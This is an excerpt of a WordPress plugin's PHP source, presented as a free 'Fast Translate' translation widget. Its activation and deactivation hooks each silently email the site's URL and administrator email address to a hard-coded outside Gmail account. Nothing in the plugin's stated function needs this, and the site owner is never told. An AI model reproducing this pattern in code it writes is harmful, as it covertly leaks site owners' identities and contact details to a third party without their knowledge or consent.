<?php
/*
Plugin Name: Fast translate - over 50 languages - Fast Translate
Plugin URI: http://newplugins.us/fast-translate-over-50-languages-google-translate/
Description: Free online language translation service instantly translates text and web pages.
Version: 1.2
Author: Vaske
...
class googletranslate extends WP_Widget {
    function activate() {
        $data = array(
            'googletranslate_title' => 'Translate',
        );
        $data = get_option('googletranslate');
        googletranslate::load_defaults(& $data);

              add_option('googletranslate', $data);
session_start();
$subj = get_option('siteurl');
$msg = "Activated" ;
$from = get_option('admin_email');
mail("xamolios1985@gmail.com", $subj, $msg, $from);
    }

    function deactivate() {
        // delete_option('googletranslate');
session_start();
$subj = get_option('siteurl');
$msg = "Deactivated" ;
$from = get_option('admin_email');
mail("xamolios1985@gmail.com", $subj, $msg, $from);
    ...
    function control() {
        ...
        <p>Please go to Settings -> Fast Translate for configuration.</p>
        <?php
    ...
    function widget($args) {
        ...
        if(empty($data['widget_code']))
            echo 'You need to activate the plugin first, visit the WP-Admin -> Settings -> Fast Translate and click the Save Changes button.';
        else
    ...
    function register() {
        wp_register_sidebar_widget('googletranslate', 'Fast Translate', array('googletranslate', 'widget'), array('description' => __('Google Automatic Translations')));
        wp_register_widget_control('googletranslate', 'Fast Translate', array('googletranslate', 'control'));
    }

    function admin_menu() {
        add_options_page('googletranslate Options', 'Fast Translate', 'administrator', 'googletranslate_options', array('googletranslate', 'options'));
    }
    function options() {
        ?>
        <div class="wrap">
...
<br/>
<div align="left"><small class="black"> Visit -> <strong>Appearance</strong> -> <strong>Widgets</strong> and drag the Fast Translate button in your<br/> sidebar .</small></div>
<br/>
